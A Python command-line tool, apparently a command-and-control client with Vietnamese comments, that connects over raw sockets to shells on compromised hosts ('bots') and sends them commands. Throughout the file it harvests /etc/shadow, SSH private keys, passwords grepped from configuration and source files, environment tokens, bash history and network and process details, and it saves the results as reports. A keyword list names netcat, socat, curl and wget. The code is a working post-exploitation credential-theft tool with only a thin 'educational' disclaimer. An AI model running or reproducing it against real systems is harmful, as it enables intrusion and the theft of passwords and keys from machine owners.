#!/usr/bin/env python3
"""
Bot Intelligence - Thu thập thông tin tình báo từ bot lạ
Advanced intelligence gathering từ compromised bots
"""

import os
import sys
import time
import json
import socket
import threading
import subprocess
import requests
import re
from datetime import datetime
from typing import Dict, List, Set, Optional
import base64
import hashlib
import urllib.parse

class BotIntelligence:
    def __init__(self, c2_port=7777):
        self.c2_port = c2_port
        self.intelligence_data = {}
        self.target_bots = []
        self.intelligence_log = "bot_intelligence.log"
        
    def log_intelligence(self, action: str, target: str, data: str):
        """Log intelligence activities"""
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'action': action,
            'target': target,
            'data': data
        }
        
        try:
            with open(self.intelligence_log, 'a') as f:
                f.write(json.dumps(log_entry) + '\n')
        except Exception as e:
            print(f"❌ Error logging: {e}")
    
    def send_command_to_bot(self, bot_ip: str, bot_port: int, command: str) -> Optional[str]:
        """Gửi command đến bot và nhận response"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)
            sock.connect((bot_ip, bot_port))
            sock.send(f"{command}\n".encode())
            response = sock.recv(8192).decode().strip()
            sock.close()
            
            self.log_intelligence("COMMAND_SENT", f"{bot_ip}:{bot_port}", f"Command: {command}")
            return response
            
        except Exception as e:
            print(f"❌ Error sending command to {bot_ip}:{bot_port}: {e}")
            return None
    
    def gather_system_intelligence(self, bot_ip: str, bot_port: int) -> Dict:
        """Thu thập thông tin tình báo hệ thống"""
        print(f"🔍 Gathering system intelligence from {bot_ip}:{bot_port}")
        
        intelligence = {
            'ip': bot_ip,
            'port': bot_port,
            'timestamp': datetime.now().isoformat(),
            'system': {},
            'users': {},
            'processes': {},
            'network': {},
            'files': {},
            'credentials': {},
            'malware': {},
            'c2_servers': {}
        }
        
        # System information
        system_commands = {
            'hostname': 'hostname',
            'os': 'uname -a',
            'kernel': 'uname -r',
            'architecture': 'uname -m',
            'uptime': 'uptime',
            'memory': 'free -h',
            'disk': 'df -h',
            'cpu': 'lscpu',
            'version': 'cat /etc/os-release',
            'timezone': 'timedatectl',
            'locale': 'locale'
        }
        
        for key, command in system_commands.items():
            try:
                response = self.send_command_to_bot(bot_ip, bot_port, command)
                if response:
                    intelligence['system'][key] = response
                    print(f"  ✅ {key}: {response[:50]}...")
            except Exception as e:
                print(f"  ❌ Error getting {key}: {e}")
        
        return intelligence
    
    def gather_user_intelligence(self, bot_ip: str, bot_port: int) -> Dict:
        """Thu thập thông tin người dùng"""
        print(f"👤 Gathering user intelligence from {bot_ip}:{bot_port}")
        
        user_intel = {
            'current_user': None,
            'all_users': [],
            'logged_users': [],
            'sudo_users': [],
            'ssh_keys': [],
            'bash_history': [],
            'recent_commands': []
        }
        
        user_commands = {
            'current_user': 'whoami',
            'all_users': 'cat /etc/passwd',
            'logged_users': 'who',
            'sudo_users': 'getent group sudo',
            'ssh_keys': 'find /home -name "id_rsa*" -o -name "authorized_keys"',
            'bash_history': 'cat ~/.bash_history | tail -50',
            'recent_commands': 'history | tail -20'
        }
        
        for key, command in user_commands.items():
            try:
                response = self.send_command_to_bot(bot_ip, bot_port, command)
                if response:
                    user_intel[key] = response
                    print(f"  ✅ {key}: {response[:50]}...")
            except Exception as e:
                print(f"  ❌ Error getting {key}: {e}")
        
        return user_intel
    
    def gather_process_intelligence(self, bot_ip: str, bot_port: int) -> Dict:
        """Thu thập thông tin processes"""
        print(f"⚙️ Gathering process intelligence from {bot_ip}:{bot_port}")
        
        process_intel = {
            'all_processes': [],
            'network_processes': [],
            'suspicious_processes': [],
            'cron_jobs': [],
            'services': [],
            'startup_programs': []
        }
        
        process_commands = {
            'all_processes': 'ps aux',
            'network_processes': 'netstat -tulpn',
            'cron_jobs': 'crontab -l',
            'services': 'systemctl list-units --type=service',
            'startup_programs': 'ls -la /etc/init.d/'
        }
        
        for key, command in process_commands.items():
            try:
                response = self.send_command_to_bot(bot_ip, bot_port, command)
                if response:
                    process_intel[key] = response
                    print(f"  ✅ {key}: {response[:50]}...")
            except Exception as e:
                print(f"  ❌ Error getting {key}: {e}")
        
        # Analyze for suspicious processes
        if process_intel['all_processes']:
            suspicious_keywords = ['nc', 'netcat', 'ncat', 'socat', 'curl', 'wget', 'python', 'perl', 'bash', 'sh']
            for line in process_intel['all_processes'].split('\n'):
                for keyword in suspicious_keywords:
                    if keyword in line.lower():
                        process_intel['suspicious_processes'].append(line)
                        break
        
        return process_intel
    
    def gather_network_intelligence(self, bot_ip: str, bot_port: int) -> Dict:
        """Thu thập thông tin mạng"""
        print(f"🌐 Gathering network intelligence from {bot_ip}:{bot_port}")
        
        network_intel = {
            'interfaces': [],
            'routes': [],
            'connections': [],
            'dns': [],
            'arp': [],
            'firewall': [],
            'listening_ports': []
        }
        
        network_commands = {
            'interfaces': 'ip addr show',
            'routes': 'ip route show',
            'connections': 'netstat -tulpn',
            'dns': 'cat /etc/resolv.conf',
            'arp': 'arp -a',
            'firewall': 'iptables -L',
            'listening_ports': 'ss -tulpn'
        }
        
        for key, command in network_commands.items():
            try:
                response = self.send_command_to_bot(bot_ip, bot_port, command)
                if response:
                    network_intel[key] = response
                    print(f"  ✅ {key}: {response[:50]}...")
            except Exception as e:
                print(f"  ❌ Error getting {key}: {e}")
        
        return network_intel
    
    def gather_credential_intelligence(self, bot_ip: str, bot_port: int) -> Dict:
        """Thu thập thông tin credentials"""
        print(f"🔐 Gathering credential intelligence from {bot_ip}:{bot_port}")
        
        cred_intel = {
            'passwd_file': [],
            'shadow_file': [],
            'ssh_keys': [],
            'database_creds': [],
            'web_creds': [],
            'api_keys': [],
            'config_files': []
        }
        
        cred_commands = {
            'passwd_file': 'cat /etc/passwd',
            'shadow_file': 'cat /etc/shadow',
            'ssh_keys': 'find /home -name "id_rsa*" -o -name "authorized_keys" -exec cat {} \\;',
            'database_creds': 'find /home -name "*.conf" -o -name "*.cfg" | xargs grep -i "password\\|user\\|host"',
            'web_creds': 'find /home -name "*.php" -o -name "*.py" -o -name "*.js" | xargs grep -i "password\\|api_key"',
            'api_keys': 'env | grep -i "key\\|token\\|secret"',
            'config_files': 'find /home -name "*.conf" -o -name "*.cfg" -o -name "*.ini"'
        }
        
        for key, command in cred_commands.items():
            try:
                response = self.send_command_to_bot(bot_ip, bot_port, command)
                if response:
                    cred_intel[key] = response
                    print(f"  ✅ {key}: {response[:50]}...")
            except Exception as e:
                print(f"  ❌ Error getting {key}: {e}")
        
        return cred_intel
    
    def gather_malware_intelligence(self, bot_ip: str, bot_port: int) -> Dict:
        """Thu thập thông tin malware"""
        print(f"🦠 Gathering malware intelligence from {bot_ip}:{bot_port}")
        
        malware_intel = {
            'suspicious_files': [],
            'recent_downloads': [],
            'cron_jobs': [],
            'startup_scripts': [],
            'network_connections': [],
            'process_tree': []
        }
        
        malware_commands = {
            'suspicious_files': 'find /tmp /var/tmp /dev/shm -type f -name "*" | head -20',
            'recent_downloads': 'find /home -name "*.py" -o -name "*.sh" -o -name "*.exe" -mtime -7',
            'cron_jobs': 'crontab -l',
            'startup_scripts': 'ls -la /etc/init.d/ /etc/systemd/system/',
            'network_connections': 'netstat -tulpn | grep ESTABLISHED',
            'process_tree': 'pstree -p'
        }
        
        for key, command in malware_commands.items():
            try:
                response = self.send_command_to_bot(bot_ip, bot_port, command)
                if response:
                    malware_intel[key] = response
                    print(f"  ✅ {key}: {response[:50]}...")
            except Exception as e:
                print(f"  ❌ Error getting {key}: {e}")
        
        return malware_intel
    
    def gather_c2_intelligence(self, bot_ip: str, bot_port: int) -> Dict:
        """Thu thập thông tin C2 servers"""
        print(f"🎯 Gathering C2 intelligence from {bot_ip}:{bot_port}")
        
        c2_intel = {
            'dns_queries': [],
            'network_connections': [],
            'suspicious_domains': [],
            'c2_indicators': [],
            'communication_patterns': []
        }
        
        c2_commands = {
            'dns_queries': 'cat /etc/hosts',
            'network_connections': 'netstat -tulpn | grep ESTABLISHED',
            'suspicious_domains': 'find /home -name "*.log" | xargs grep -i "http\\|https" | head -20',
            'c2_indicators': 'ps aux | grep -E "nc\\|netcat\\|curl\\|wget\\|python\\|perl"',
            'communication_patterns': 'ss -tulpn | grep -E ":80\\|:443\\|:8080\\|:4444\\|:7777"'
        }
        
        for key, command in c2_commands.items():
            try:
                response = self.send_command_to_bot(bot_ip, bot_port, command)
                if response:
                    c2_intel[key] = response
                    print(f"  ✅ {key}: {response[:50]}...")
            except Exception as e:
                print(f"  ❌ Error getting {key}: {e}")
        
        return c2_intel
    
    def analyze_intelligence(self, intelligence_data: Dict) -> Dict:
        """Phân tích thông tin tình báo"""
        print("🧠 Analyzing intelligence data...")
        
        analysis = {
            'threat_level': 'LOW',
            'bot_type': 'UNKNOWN',
            'capabilities': [],
            'indicators': [],
            'recommendations': []
        }
        
        # Analyze system info
        if 'system' in intelligence_data:
            system_info = intelligence_data['system']
            
            # Check OS
            if 'os' in system_info:
                os_info = system_info['os']
                if 'ubuntu' in os_info.lower():
                    analysis['bot_type'] = 'UBUNTU_BOT'
                elif 'centos' in os_info.lower():
                    analysis['bot_type'] = 'CENTOS_BOT'
                elif 'debian' in os_info.lower():
                    analysis['bot_type'] = 'DEBIAN_BOT'
            
            # Check architecture
            if 'architecture' in system_info:
                arch = system_info['architecture']
                if 'x86_64' in arch:
                    analysis['capabilities'].append('64-bit')
                elif 'arm' in arch:
                    analysis['capabilities'].append('ARM')
        
        # Analyze processes
        if 'processes' in intelligence_data:
            processes = intelligence_data['processes']
            
            # Check for suspicious processes
            if 'suspicious_processes' in processes:
                suspicious = processes['suspicious_processes']
                if len(suspicious) > 0:
                    analysis['threat_level'] = 'HIGH'
                    analysis['indicators'].append('Suspicious processes detected')
        
        # Analyze network
        if 'network' in intelligence_data:
            network = intelligence_data['network']
            
            # Check for C2 connections
            if 'connections' in network:
                connections = network['connections']
                if '7777' in connections or '4444' in connections:
                    analysis['threat_level'] = 'HIGH'
                    analysis['indicators'].append('C2 connections detected')
        
        # Generate recommendations
        if analysis['threat_level'] == 'HIGH':
            analysis['recommendations'].append('Immediate isolation recommended')
            analysis['recommendations'].append('Full system scan required')
        elif analysis['threat_level'] == 'MEDIUM':
            analysis['recommendations'].append('Monitor closely')
            analysis['recommendations'].append('Review network traffic')
        else:
            analysis['recommendations'].append('Continue monitoring')
        
        return analysis
    
    def full_intelligence_gathering(self, bot_ip: str, bot_port: int) -> Dict:
        """Thu thập thông tin tình báo toàn diện"""
        print(f"🎯 Starting full intelligence gathering on {bot_ip}:{bot_port}")
        print("=" * 70)
        
        intelligence_result = {
            'target': f"{bot_ip}:{bot_port}",
            'timestamp': datetime.now().isoformat(),
            'system': {},
            'users': {},
            'processes': {},
            'network': {},
            'credentials': {},
            'malware': {},
            'c2_servers': {},
            'analysis': {}
        }
        
        # 1. System intelligence
        print("1️⃣ System Intelligence...")
        intelligence_result['system'] = self.gather_system_intelligence(bot_ip, bot_port)
        
        # 2. User intelligence
        print("\n2️⃣ User Intelligence...")
        intelligence_result['users'] = self.gather_user_intelligence(bot_ip, bot_port)
        
        # 3. Process intelligence
        print("\n3️⃣ Process Intelligence...")
        intelligence_result['processes'] = self.gather_process_intelligence(bot_ip, bot_port)
        
        # 4. Network intelligence
        print("\n4️⃣ Network Intelligence...")
        intelligence_result['network'] = self.gather_network_intelligence(bot_ip, bot_port)
        
        # 5. Credential intelligence
        print("\n5️⃣ Credential Intelligence...")
        intelligence_result['credentials'] = self.gather_credential_intelligence(bot_ip, bot_port)
        
        # 6. Malware intelligence
        print("\n6️⃣ Malware Intelligence...")
        intelligence_result['malware'] = self.gather_malware_intelligence(bot_ip, bot_port)
        
        # 7. C2 intelligence
        print("\n7️⃣ C2 Intelligence...")
        intelligence_result['c2_servers'] = self.gather_c2_intelligence(bot_ip, bot_port)
        
        # 8. Analysis
        print("\n8️⃣ Intelligence Analysis...")
        intelligence_result['analysis'] = self.analyze_intelligence(intelligence_result)
        
        # Save intelligence result
        result_file = f"intelligence_report_{bot_ip}_{int(time.time())}.json"
        with open(result_file, 'w') as f:
            json.dump(intelligence_result, f, indent=2)
        
        print(f"\n✅ Intelligence gathering completed! Report saved to {result_file}")
        
        # Print summary
        print("\n📊 INTELLIGENCE SUMMARY:")
        print(f"  🎯 Target: {bot_ip}:{bot_port}")
        print(f"  🚨 Threat Level: {intelligence_result['analysis']['threat_level']}")
        print(f"  🤖 Bot Type: {intelligence_result['analysis']['bot_type']}")
        print(f"  🔧 Capabilities: {', '.join(intelligence_result['analysis']['capabilities'])}")
        print(f"  ⚠️  Indicators: {len(intelligence_result['analysis']['indicators'])}")
        print(f"  💡 Recommendations: {len(intelligence_result['analysis']['recommendations'])}")
        
        return intelligence_result
    
    def interactive_intelligence(self):
        """Interactive intelligence gathering mode"""
        print("🎯 Bot Intelligence - Interactive Mode")
        print("=" * 50)
        
        while True:
            print("\n📋 Available commands:")
            print("  1. scan     - Scan connected bots")
            print("  2. intel    - Full intelligence gathering")
            print("  3. system   - System intelligence")
            print("  4. users    - User intelligence")
            print("  5. process  - Process intelligence")
            print("  6. network  - Network intelligence")
            print("  7. creds    - Credential intelligence")
            print("  8. malware  - Malware intelligence")
            print("  9. c2       - C2 intelligence")
            print("  10. quit    - Exit")
            
            try:
                command = input("\n🎯 intel@c2:~$ ").strip().lower()
                
                if command == "scan":
                    # Get connected bots (simplified)
                    print("🔍 Scanning for connected bots...")
                    print("  (This would scan for active connections)")
                
                elif command == "intel":
                    ip = input("Enter bot IP: ").strip()
                    port = int(input("Enter bot port: ").strip())
                    self.full_intelligence_gathering(ip, port)
                
                elif command == "system":
                    ip = input("Enter bot IP: ").strip()
                    port = int(input("Enter bot port: ").strip())
                    self.gather_system_intelligence(ip, port)
                
                elif command == "users":
                    ip = input("Enter bot IP: ").strip()
                    port = int(input("Enter bot port: ").strip())
                    self.gather_user_intelligence(ip, port)
                
                elif command == "process":
                    ip = input("Enter bot IP: ").strip()
                    port = int(input("Enter bot port: ").strip())
                    self.gather_process_intelligence(ip, port)
                
                elif command == "network":
                    ip = input("Enter bot IP: ").strip()
                    port = int(input("Enter bot port: ").strip())
                    self.gather_network_intelligence(ip, port)
                
                elif command == "creds":
                    ip = input("Enter bot IP: ").strip()
                    port = int(input("Enter bot port: ").strip())
                    self.gather_credential_intelligence(ip, port)
                
                elif command == "malware":
                    ip = input("Enter bot IP: ").strip()
                    port = int(input("Enter bot port: ").strip())
                    self.gather_malware_intelligence(ip, port)
                
                elif command == "c2":
                    ip = input("Enter bot IP: ").strip()
                    port = int(input("Enter bot port: ").strip())
                    self.gather_c2_intelligence(ip, port)
                
                elif command == "quit":
                    break
                
                else:
                    print("❓ Unknown command")
                    
            except KeyboardInterrupt:
                print("\n👋 Goodbye!")
                break
            except Exception as e:
                print(f"❌ Error: {e}")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="Bot Intelligence - Advanced Intelligence Gathering")
    parser.add_argument('--intel', type=str, help='Full intelligence gathering (IP:PORT)')
    parser.add_argument('--system', type=str, help='System intelligence (IP:PORT)')
    parser.add_argument('--users', type=str, help='User intelligence (IP:PORT)')
    parser.add_argument('--process', type=str, help='Process intelligence (IP:PORT)')
    parser.add_argument('--network', type=str, help='Network intelligence (IP:PORT)')
    parser.add_argument('--creds', type=str, help='Credential intelligence (IP:PORT)')
    parser.add_argument('--malware', type=str, help='Malware intelligence (IP:PORT)')
    parser.add_argument('--c2', type=str, help='C2 intelligence (IP:PORT)')
    parser.add_argument('--interactive', action='store_true', help='Interactive mode')
    parser.add_argument('--port', type=int, default=7777, help='C2 port to monitor')
    
    args = parser.parse_args()
    
    intelligence = BotIntelligence(args.port)
    
    if args.intel:
        if ':' in args.intel:
            ip, port = args.intel.split(':', 1)
            port = int(port)
            intelligence.full_intelligence_gathering(ip, port)
        else:
            print("❌ Invalid format. Use IP:PORT")
    
    elif args.system:
        if ':' in args.system:
            ip, port = args.system.split(':', 1)
            port = int(port)
            intelligence.gather_system_intelligence(ip, port)
        else:
            print("❌ Invalid format. Use IP:PORT")
    
    elif args.users:
        if ':' in args.users:
            ip, port = args.users.split(':', 1)
            port = int(port)
            intelligence.gather_user_intelligence(ip, port)
        else:
            print("❌ Invalid format. Use IP:PORT")
    
    elif args.process:
        if ':' in args.process:
            ip, port = args.process.split(':', 1)
            port = int(port)
            intelligence.gather_process_intelligence(ip, port)
        else:
            print("❌ Invalid format. Use IP:PORT")
    
    elif args.network:
        if ':' in args.network:
            ip, port = args.network.split(':', 1)
            port = int(port)
            intelligence.gather_network_intelligence(ip, port)
        else:
            print("❌ Invalid format. Use IP:PORT")
    
    elif args.creds:
        if ':' in args.creds:
            ip, port = args.creds.split(':', 1)
            port = int(port)
            intelligence.gather_credential_intelligence(ip, port)
        else:
            print("❌ Invalid format. Use IP:PORT")
    
    elif args.malware:
        if ':' in args.malware:
            ip, port = args.malware.split(':', 1)
            port = int(port)
            intelligence.gather_malware_intelligence(ip, port)
        else:
            print("❌ Invalid format. Use IP:PORT")
    
    elif args.c2:
        if ':' in args.c2:
            ip, port = args.c2.split(':', 1)
            port = int(port)
            intelligence.gather_c2_intelligence(ip, port)
        else:
            print("❌ Invalid format. Use IP:PORT")
    
    elif args.interactive:
        intelligence.interactive_intelligence()
    
    else:
        print("🎯 Bot Intelligence - Advanced Intelligence Gathering")
        print("⚠️  For educational/research purposes only!")
        print("")
        print("Available commands:")
        print("  --intel      Full intelligence gathering (IP:PORT)")
        print("  --system     System intelligence (IP:PORT)")
        print("  --users      User intelligence (IP:PORT)")
        print("  --process    Process intelligence (IP:PORT)")
        print("  --network    Network intelligence (IP:PORT)")
        print("  --creds      Credential intelligence (IP:PORT)")
        print("  --malware    Malware intelligence (IP:PORT)")
        print("  --c2         C2 intelligence (IP:PORT)")
        print("  --interactive Interactive mode")
        print("")
        print("Examples:")
        print("  python3 bot_intelligence.py --intel 192.168.1.100:7777")
        print("  python3 bot_intelligence.py --creds 192.168.1.100:7777")
        print("  python3 bot_intelligence.py --interactive")

if __name__ == "__main__":
    main()
